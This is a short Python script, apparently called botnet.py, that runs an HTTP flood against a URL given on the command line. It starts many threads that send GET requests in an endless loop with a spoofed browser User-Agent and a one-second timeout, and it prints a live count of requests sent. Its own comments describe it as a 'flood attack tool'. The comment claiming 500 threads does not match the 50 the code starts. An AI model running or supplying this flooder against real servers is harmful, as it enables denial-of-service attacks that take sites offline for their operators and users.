import urllib.request as urllib2
import sys
import threading
import random
import time

# Simple settings
url = ''
host = ''
request_counter = 0

def inc_counter():
    global request_counter
    request_counter += 1

def buildblock(size):
    return ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))

def httpcall(url):
    try:
        
        # Adding timeout=1 is the key to making the script send requests without waiting for a response.
        # This is what transforms the script from a mere "slow browser" into a "flood attack tool."
        
        request = urllib2.Request(url)
        request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        urllib2.urlopen(request, timeout=1)
        inc_counter()
    except:
        pass

class HTTPThread(threading.Thread):
    def run(self):
        while True:
            httpcall(url)

if len(sys.argv) < 2:
    print("Usage: python3 botnet.py http://192.168.1.25/")
    sys.exit()

url = sys.argv[1]
host = url.split("//")[1].split("/")[0]

print(f"--- Starting Attack on {host} ---")

# Run 500 threads to increase pressure
for i in range(50):
    t = HTTPThread()
    t.daemon = True
    t.start()
    
# Monitoring loop to display attack status
while True:
    print(f"Requests Sent: {request_counter}")
    time.sleep(1)
